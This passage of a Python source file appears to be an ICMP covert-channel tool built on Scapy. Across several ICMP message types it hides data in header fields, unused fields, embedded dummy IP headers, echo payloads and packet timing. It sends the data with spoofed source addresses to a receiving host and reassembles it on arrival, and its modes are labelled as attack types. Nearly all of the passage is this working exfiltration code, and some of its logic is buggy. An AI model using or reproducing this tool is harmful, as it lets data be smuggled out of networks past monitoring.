                current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
            else:
                current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
            icmp_ts_rx=int((current_time - midnight).total_seconds() * 1000) 
            
            data_pkt=int.from_bytes(data[index+4:index+5]) *10**3
            if current_time.second+1<60:
                current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
            else:
                current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
            icmp_ts_tx=int((current_time - midnight).total_seconds() * 1000) 

            pkt= Ether(dst=self.dst_mac) \
                /IP(src=ip_src, dst=self.ip_dst.compressed) \
                /ICMP(
                    type=self.TIMESTAMP_REP
                    ,id=icmp_id
                    ,ts_ori=icmp_ts_ori
                    ,ts_rx=icmp_ts_rx
                    ,ts_tx=icmp_ts_tx 
                )#/ data[index+5:index+max_block]
            #pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 
    
    def send_last(self): 
        pkt= Ether(dst=self.dst_mac) \
            / IP(dst=self.ip_dst.compressed) \
            /ICMP(type=self.TIMESTAMP_REP,
                  id=self.stop_integer,seq=self.stop_integer)
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface)  

class IPV4_REDIRECT(_IPx):  
    REDIRECT=ICMP_TYPE.v4_Redirect

    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and packet[ICMP].type==self.REDIRECT.value:  
                if not packet.haslayer(ICMPerror) or (packet[ICMPerror].id==self.stop_integer and packet[ICMPerror].seq==self.stop_integer): 
                    #THREADING_EVENT.set(self.event_pktconn)
                    self.stop_flag["value"]=True 
                    return 
                if inner_ip:=packet.getlayer(IPerror): 
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                if inner_ip:=packet.getlayer(ICMPerror): 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))         
        return callback

    def wait(self):
        super().wait([self.REDIRECT]) 
    
    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None):  
        if not is_bytes(data): 
            raise Exception(f"data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception("ip_dst non corretto")
        if not self.dst_mac:
            self.dst_mac = GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=INTERFACE_FROM_IP(self.ip_dst).interface     
        if not is_ipaddress(ip_src) or ip_src.version!=4:  
            raise Exception("ip_src non valido",ip_src)  
        for index in range(0, len(data), 9): 
            #icmp_id=(data[index]<<8)+data[index+1]
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1 ,
                        len=int.from_bytes(data[index:index+2]), 
                        id=int.from_bytes(data[index+2:index+4]), 
                        ttl=int.from_bytes(data[index+4:index+5])) / \
                ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
            pkt= Ether(dst=self.dst_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /ICMP(type=self.REDIRECT)\
                /bytes(dummy_ip)[:28]
            #pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 
    
    def send_last(self): 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1)/\
            ICMP(id=self.stop_integer,seq=self.stop_integer)
        pkt= Ether(dst=self.dst_mac)\
            /IP(dst=self.ip_dst.compressed)\
            /ICMP(type=self.REDIRECT)/bytes(dummy_ip)[:28]
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface)  

class IPV4_SOURCE_QUENCH(_IPx): 
    SOURCE_QUENCH=ICMP_TYPE.v4_SourceQuench

    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and packet[ICMP].type==self.SOURCE_QUENCH.value:  
                if not packet.haslayer(ICMPerror) or (packet[ICMPerror].id==self.stop_integer and packet[ICMPerror].seq==self.stop_integer): 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return 
                #self.data.append(packet[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                raw = bytes(packet[ICMP])
                unused = int.from_bytes(raw[4:8], byteorder="big") 
                #print("UNUSED: ", unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                self.data.append(unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00'))
                if inner_ip:=packet.getlayer(IPerror): 
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                if inner_ip:=packet.getlayer(ICMPerror): 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))       
        return callback

    def wait(self):
        super().wait([self.SOURCE_QUENCH]) 
    
    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None): 
        def get_packet(): 
            #nonlocal self, data, index, ip_src
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                        len=int.from_bytes(data[index:index+2]), 
                        id=int.from_bytes(data[index+2:index+4]), 
                        ttl=int.from_bytes(data[index+4:index+5])) / \
                ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
            pkt= Ether(dst=self.dst_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /ICMP(type=self.SOURCE_QUENCH)\
                /Raw(load=bytes(dummy_ip)[:28])
            #pkt.summary()
            #pkt.show() 
            return pkt
        def get_packet_unused(): 
            #nonlocal self, data, index, ip_src
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                        len=int.from_bytes(data[index+4:index+6]), 
                        id=int.from_bytes(data[index+6:index+8]), 
                        ttl=int.from_bytes(data[index+8:index+9])) / \
                ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13]))
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.SOURCE_QUENCH.value, #icmp type
                0, #icmp code 
                0, #checksum
                int.from_bytes(data[index:index+4]) #unused field
            )
            cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
            cksum &= 0xffff
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.SOURCE_QUENCH.value, 
                0, 
                cksum, 
                int.from_bytes(data[index:index+4])
            ) 
            pkt= Ether(dst=self.dst_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
            #pkt.summary()
            #pkt.show() 
            return pkt
        if not is_bytes(data):
            raise Exception(f"data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception("ip_dst non valido")
        if not self.dst_mac:
            self.dst_mac = GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=INTERFACE_FROM_IP(self.ip_dst).interface 
        if not is_enum_member(type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ") 
        if type_attacco.name.endswith("_unused"): 
            step_data=13
        else: step_data=9
        if not is_ipaddress(ip_src) or ip_src.version!=4:  
            raise Exception("ip_src non valido",ip_src)  
        for index in range(0, len(data), step_data): 
            if type_attacco.name.endswith("_unused"): pkt=get_packet_unused()
            else: pkt=get_packet()
            sendp(pkt, verbose=1, iface=self.interface) 

    def send_last(self): 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1)\
            /ICMP(id=self.stop_integer,seq=self.stop_integer) 
        pkt= Ether(dst=self.dst_mac)\
            /IP(dst=self.ip_dst.compressed, proto=1)\
            /ICMP(type=self.SOURCE_QUENCH)/Raw(load=bytes(dummy_ip)[:28])
        #pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface)  

class IPV4_PARAMETER_PROBLEM(_IPx): 
    PARAMETER_PROBLEM=ICMP_TYPE.v4_ParameterProblem

    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and packet[ICMP].type==self.PARAMETER_PROBLEM.value:  
                if not packet.haslayer(ICMPerror) or (packet[ICMPerror].id==self.stop_integer and packet[ICMPerror].seq==self.stop_integer): 
                    #THREADING_EVENT.set(self.event_pktconn)
                    self.stop_flag["value"]=True 
                    return 
                #print("PTR:",packet[ICMP].ptr.to_bytes(1,"big").decode())
                self.data.append(packet[ICMP].ptr.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00'))
                #self.data.append(packet[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                raw = bytes(packet[ICMP])
                unused = int.from_bytes(raw[5:8], byteorder="big") 
                #print("UNUSED: ", unused.to_bytes(3,"big").decode().lstrip('\x00').rstrip('\x00')) 
                self.data.append(unused.to_bytes(3,"big").decode().lstrip('\x00').rstrip('\x00'))
                if inner_ip:=packet.getlayer(IPerror): 
                    #print("IPerror:",
                    #      inner_ip.len.to_bytes(2,"big").decode(),
                    #      inner_ip.id.to_bytes(2,"big").decode(),
                    #      inner_ip.ttl.to_bytes(2,"big").decode())
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                if inner_ip:=packet.getlayer(ICMPerror): 
                    #print("IPerror:", 
                    #      inner_ip.id.to_bytes(2,"big").decode(),
                    #      inner_ip.seq.to_bytes(2,"big").decode())
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))                   
        return callback
    
    def wait(self):
        super().wait([self.PARAMETER_PROBLEM]) 
    
    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None): 
        def get_packet(): 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                    len=int.from_bytes(data[index+1:index+3]), 
                    id=int.from_bytes(data[index+3:index+5]), 
                    ttl=int.from_bytes(data[index+5:index+6]))\
                /ICMP(type=0, id=int.from_bytes(data[index+6:index+8]),seq=int.from_bytes(data[index+8:index+10]))
            pkt= Ether(dst=self.dst_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /ICMP(type=self.PARAMETER_PROBLEM, ptr=int(data[index]))\
                /Raw(load=bytes(dummy_ip)[:28])
            #pkt.summary()
            #pkt.show()
            return pkt 
        def get_packet_unused(): 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                    len=int.from_bytes(data[index+4:index+6]), 
                    id=int.from_bytes(data[index+6:index+8]), 
                    ttl=int.from_bytes(data[index+8:index+9])) / \
                ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13]))
            icmp_hdr = struct.pack(
                "!BBHB3s", 
                self.PARAMETER_PROBLEM.value, #icmp type
                0, #icmp code
                0, #checksum
                int(data[index]), #pointer
                data[index+1:index+4] #unused field
            )
            cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
            cksum &= 0xffff
            icmp_hdr = struct.pack(
                "!BBHB3s", 
                self.PARAMETER_PROBLEM.value, 
                0, 
                cksum, 
                int(data[index]), #pointer
                data[index+1:index+4] #unused field
            ) 
            pkt= Ether(dst=self.dst_mac)/\
                IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)/\
                Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
            #pkt.summary()
            #pkt.show()
            return pkt
        if not is_bytes(data): 
            raise Exception(f"data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception(f"ip_dst non valido")  
        if not self.dst_mac:
            self.dst_mac = GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower() 
        if not self.interface:
            self.interface=INTERFACE_FROM_IP(self.ip_dst).interface   
        if not is_enum_member(type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ") 
        if type_attacco.name.endswith("_unused"): 
            step_data=13
        else: step_data=10 
        if not is_ipaddress(ip_src) or ip_src.version!=4:  
            raise Exception("ip_src non valido",ip_src)  
        for index in range(0, len(data), step_data): 
            if type_attacco.name.endswith("_unused"): pkt=get_packet_unused()
            else: pkt=get_packet()
            sendp(pkt, verbose=1, iface=self.interface) #iface=self.interface
    
    def send_last(self): 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1)/\
            ICMP(id=self.stop_integer,seq=self.stop_integer)
        pkt= Ether(dst=self.dst_mac)\
            /IP(dst=self.ip_dst.compressed, proto=1)\
            /ICMP(type=self.PARAMETER_PROBLEM)\
            /Raw(load=bytes(dummy_ip)[:28])
        #pkt.summary() 
        #pkt.show() 
        sendp(pkt, verbose=1, iface=self.interface)  

class IPV4_TIME_EXCEEDED(_IPx):  
    TIME_EXCEEDED=ICMP_TYPE.v4_TimeExceeded 

    def get_callback(self): 
        def callback(packet):  
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and packet[ICMP].type==self.TIME_EXCEEDED.value: 
                #print(f"Callbak 'v4_parameter_problem' arrived packet: {packet.summary()}")
                if not packet.haslayer(ICMPerror) or (packet[ICMPerror].id==self.stop_integer and packet[ICMPerror].seq==self.stop_integer): 
                    #THREADING_EVENT.set(self.event_pktconn)
                    self.stop_flag["value"]=True 
                    return 
                #self.data.append(packet[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                raw = bytes(packet[ICMP])
                unused = int.from_bytes(raw[4:8], byteorder="big") 
                #print("UNUSED: ", unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                self.data.append(unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00'))
                if inner_ip:=packet.getlayer(IPerror): 
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                if inner_ip:=packet.getlayer(ICMPerror): 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))                  
        return callback

    def wait(self): 
        super().wait([self.TIME_EXCEEDED])  
        
    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None):  
        def get_packet(): 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                        len=int.from_bytes(data[index:index+2]), 
                        id=int.from_bytes(data[index+2:index+4]), 
                        ttl=int.from_bytes(data[index+4:index+5]))\
                /ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
            pkt= Ether(dst=self.dst_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /ICMP(type=self.TIME_EXCEEDED)\
                /Raw(load=bytes(dummy_ip)[:28])
            #pkt.summary()
            #pkt.show() 
            return pkt
        def get_packet_unused(): 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                        len=int.from_bytes(data[index+4:index+6]), 
                        id=int.from_bytes(data[index+6:index+8]), 
                        ttl=int.from_bytes(data[index+8:index+9])) / \
                ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13]))
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.TIME_EXCEEDED.value, #icmp type
                0, #icmp code
                0, #checksum
                int.from_bytes(data[index:index+4]) #unused field
            )
            cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
            cksum &= 0xffff
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.TIME_EXCEEDED.value, 
                0, 
                cksum, 
                int.from_bytes(data[index:index+4])
            ) 
            pkt= Ether(dst=self.dst_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
            #pkt.summary()
            #pkt.show()
            return pkt
        if not is_bytes(data): 
            raise Exception(f"data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception(f"ip_dst non corretto")  
        if not self.dst_mac:
            self.dst_mac = GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=INTERFACE_FROM_IP(self.ip_dst).interface 
        if not is_enum_member(type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ") 
        if "_unused" in type_attacco.name: 
            step_data=13
        else: step_data=9 
        if not is_ipaddress(ip_src) or ip_src.version!=4: 
            raise Exception("ip_src non valido",ip_src)  
        for index in range(0, len(data), step_data):
            if step_data==13: pkt=get_packet_unused()
            else: pkt=get_packet()
            sendp(pkt, verbose=1, iface=self.interface) 
    
    def send_last(self): 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1)\
            /ICMP(id=self.stop_integer,seq=self.stop_integer)
        pkt= Ether(dst=self.dst_mac)\
            /IP(dst=self.ip_dst.compressed, proto=1)\
            /ICMP(type=self.TIME_EXCEEDED)\
            /Raw(load=bytes(dummy_ip)[:28])
        #pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface) 

class IPV4_DESTINATION_UNRECHABLE(_IPx): 
    DESTINATION_UNREACHABLE=ICMP_TYPE.v4_DestinationUnreachable 
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            #print(packet.show())
            if packet.haslayer(IP) and packet.haslayer(ICMP) and packet[ICMP].type==self.DESTINATION_UNREACHABLE.value:  
                if not packet.haslayer(ICMPerror) or (packet[ICMPerror].id==self.stop_integer and packet[ICMPerror].seq==self.stop_integer): 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return 
                raw = bytes(packet[ICMP])
                unused = int.from_bytes(raw[4:8], byteorder="big") 
                #print("UNUSED: ", unused.to_bytes(4,"big").decode()) 
                self.data.append(unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00'))
                if inner_ip:=packet.getlayer(IPerror): 
                    #print("IPerror:",
                    #      inner_ip.len.to_bytes(2,"big").decode(),
                    #      inner_ip.id.to_bytes(2,"big").decode(),
                    #      inner_ip.ttl.to_bytes(2,"big").decode())
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                if inner_ip:=packet.getlayer(ICMPerror): 
                    #print("IPerror:", 
                    #      inner_ip.id.to_bytes(2,"big").decode(),
                    #      inner_ip.seq.to_bytes(2,"big").decode())
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))                     
        return callback

    def wait(self):
        super().wait([self.DESTINATION_UNREACHABLE])  
    
    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None):  
        def get_packet():
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1 ,
                    len=int.from_bytes(data[index:index+2]), 
                    id=int.from_bytes(data[index+2:index+4]), 
                    ttl=int.from_bytes(data[index+4:index+5])) / \
                ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
            pkt= Ether(dst=self.dst_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /ICMP(type=self.DESTINATION_UNREACHABLE, code=3)\
                /Raw(load=bytes(dummy_ip)[:28]) 
            #pkt.summary()
            #pkt.show() 
            return pkt
        def get_packet_unused(): 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1 ,
                        len=int.from_bytes(data[index+4:index+6]), 
                        id=int.from_bytes(data[index+6:index+8]), 
                        ttl=int.from_bytes(data[index+8:index+9])) / \
                ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13])) 
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.DESTINATION_UNREACHABLE.value, #icmp type
                3, #icmp code
                0, #checksum
                int.from_bytes(data[index:index+4]) #unused field
            )
            cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
            cksum &= 0xffff
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.DESTINATION_UNREACHABLE.value, 
                3, 
                cksum, 
                int.from_bytes(data[index:index+4])
            )
            pkt= Ether(dst=self.dst_mac)/\
                IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)/\
                Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
            #pkt.summary()
            #pkt.show()  
            return pkt
        if not is_bytes(data):
            raise Exception(f"data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception("ip_dst non valido")
        if not self.dst_mac:
            self.dst_mac = GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=INTERFACE_FROM_IP(self.ip_dst).interface 
        if not is_enum_member(type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ") 
        if type_attacco.name.endswith("_unused"): 
            step_data=13
        else: step_data=9 
        if not is_ipaddress(ip_src) or ip_src.version!=4:  
            raise Exception("ip_src non valido",ip_src)  
        for index in range(0, len(data), step_data):
            #if step_data==13: pkt=get_packet_unused()
            if type_attacco.name.endswith("_unused"): pkt=get_packet_unused()
            else: pkt=get_packet()
            #raw_bytes = bytes(pkt) 
            #print(raw_bytes.hex())
            sendp(pkt, verbose=1, iface=self.interface)  if pkt else print("Pacchetto non presente") 

    def send_last(self): 
        dummy_ip=IP(src=self.ip_dst.compressed, dst="8.8.8.8", proto=1)\
            /ICMP(id=self.stop_integer,seq=self.stop_integer)
        pkt= Ether(dst=self.dst_mac)/ IP(dst=self.ip_dst.compressed, proto=1)\
            /ICMP(type=self.DESTINATION_UNREACHABLE, code=3)\
            /Raw(load=bytes(dummy_ip)[:28])
        pkt.summary()
        #pkt.show() 
        sendp(pkt, verbose=1, iface=self.interface) 
        
class IPV4_ECHO(_IPx): 
    ECHO_REQ=ICMP_TYPE.v4_Echo_Request
    ECHO_REP=ICMP_TYPE.v4_Echo_Reply
    type_attacco:Enum=None 
    
    def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:list[ipaddress.IPv4Address]=None, type_attacco:Enum=None): 
        super().__init__(ip_dst, host_attivi) 
        if not is_enum_member(type_attacco, AttackType): 
            raise Exception("attacco non valida") 
        #type_attacco indicherà quali campi leggere 
        self.type_attacco=type_attacco 
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            #print(packet.summary())
            #packet.show()
            if packet.haslayer(IP) and packet.haslayer(ICMP) and (packet[ICMP].type==self.ECHO_REQ.value or packet[ICMP].type==self.ECHO_REP.value): 
                if packet[ICMP].id==self.stop_integer and packet[ICMP].seq==self.stop_integer: 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return 
                if self.type_attacco.name in [AttackType.ipv4_echo_campi.name, AttackType.ipv4_echo_campi_payload.name,AttackType.ipv4_echo_random_payload.name]: 
                    #print("ICMP ID")
                    icmp_id=packet[ICMP].id
                    byte1 = (icmp_id >> 8) & 0xFF 
                    byte2 = icmp_id & 0xFF 
                    #print("ICMP ID:",icmp_id,chr(byte1),chr(byte2))
                    self.data.append(chr(byte1)+chr(byte2)) 
                if self.type_attacco.name in [AttackType.ipv4_echo_payload.name, AttackType.ipv4_echo_campi_payload.name,AttackType.ipv4_echo_random_payload.name]: 
                    #print("ICMP PAYLOAD")
                    if packet.haslayer(Raw): 
                        #print("ICMP payload:",packet[Raw].load)
                        self.data.append(packet[Raw].load.decode()) 
                    else: 
                        print("Payload non presente") 
                        #packet.show()
        return callback
    
    def wait(self):  
        super().wait([self.ECHO_REQ, self.ECHO_REP])  
    
    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None): 
        def get_packet_campi(): 
            nonlocal identifier
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8)
            else:
                icmp_id=(data[index]<<8)+data[index+1] 
            pkt= Ether(dst=self.dst_mac)/\
                IP(src=ip_src, dst=self.ip_dst.compressed)/\
                ICMP(type=self.ECHO_REP,id=icmp_id)
            #pkt.summary()
            #pkt.show()
            return pkt  
        def get_packet_payload(): 
            nonlocal identifier
            identifier=(identifier+1)%256
            #sequenza=math.ceil(index/step_data) 
            pkt = ( 
                Ether(dst=self.dst_mac)
                / IP(src=ip_src, dst=self.ip_dst.compressed) 
                / ICMP(type=self.ECHO_REP, id=identifier, seq=0) 
                / Raw(load=data[index:index+step_data])
            ) 
            return pkt 
        def get_packet_campi_payload(): 
            nonlocal identifier
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8)
            else:
                icmp_id=(data[index]<<8)+data[index+1] 
            pkt= (
                Ether(dst=self.dst_mac)
                / IP(src=ip_src, dst=self.ip_dst.compressed)
                / ICMP(type=self.ECHO_REP,id=icmp_id) 
                / Raw(load=data[index+2:index+step_data])
            )
            #pkt.summary()
            #pkt.show()
            return pkt 
        def get_packet_random(): 
            min_block=32 #byte 
            max_block=64 #byte 
            index=0
            while index<len(data): 
                size=int(random.uniform(min_block,max_block))
                if (index+size)>len(data): 
                    size=len(data)-index  
                pkt = ( 
                    Ether(dst=self.dst_mac)
                    / IP(src=ip_src, dst=self.ip_dst.compressed) 
                    / ICMP(type=self.ECHO_REP, id=size) 
                    / Raw(load=data[index:index+size])
                ) 
                #pkt.summary() 
                index+=size 
            return pkt
        if not is_bytes(data):
            raise Exception(f"data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception("ip_dst non valido")
        if not self.dst_mac:
            self.dst_mac = GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=INTERFACE_FROM_IP(self.ip_dst).interface
        if not is_enum_member(type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ") 
        if type_attacco.name.endswith("_campi"): 
            step_data=2 
        elif type_attacco.name.endswith("_payload"): 
            #step_data=32 
            step_data=64  
        elif type_attacco.name.endswith("_campi_payload"): 
            #step_data=2+32 
            step_data=2+64  
        elif type_attacco.name.endswith("_random_payload"):
            step_data=random.choice([32+2,64+2,128+2])
        else: raise Exception("args non valido") 
        if not is_ipaddress(ip_src) or ip_src.version!=4:  
            raise Exception("ip_src non valido",ip_src)  
        identifier=0
        for index in range(0, len(data), step_data): 
            #if step_data==2: pkt=get_packet_campi()
            #elif step_data==64: pkt=get_packet_payload()
            #elif step_data in [32+2,64+2,128+2]: pkt=get_packet_campi_payload() 
            if type_attacco.name.endswith("_campi"): pkt=get_packet_campi()
            elif type_attacco.name.endswith("_payload"): pkt=get_packet_payload()
            elif type_attacco.name.endswith("_campi_payload"): pkt=get_packet_campi_payload() 
            elif type_attacco.name.endswith("_random_payload"): pkt=get_packet_campi_payload()
            else: raise Exception("step_data non valido")
            sendp(pkt, verbose=1, iface=self.interface) 
    
    def send_last(self): 
        pkt= Ether(dst=self.dst_mac)/\
            IP(dst=self.ip_dst.compressed)/\
            ICMP(type=self.ECHO_REP,
                 id=self.stop_integer,seq=self.stop_integer)
        print(pkt.summary())
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface) 

class IPV4_TIMING(_IPx): 
    timeout_callback=None
    timer=None  
    last_packet_time=None 
    numero_bit=0

    def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None, numero_bit:int=0): 
        if not is_integer(numero_bit) or numero_bit not in [1,2,4,8]: 
            raise ValueError("numero_bit non valido")
        super().__init__(ip_dst, host_attivi) 
        self.numero_bit=numero_bit 
        self.timeout_callback=self.timeout_timer_callback()  
        self.DISTANZA_TEMPI=2 #sec
        self.TEMPI_CODICI=[
            3+index*2*self.DISTANZA_TEMPI for index in range(2**self.numero_bit)
        ] 
        self.TEMPO_BYTE=0*60 #minuti 
    
    def get_callback(self):  
        DISTANZA_TEMPI=2 #sec
        dict_tempi={}
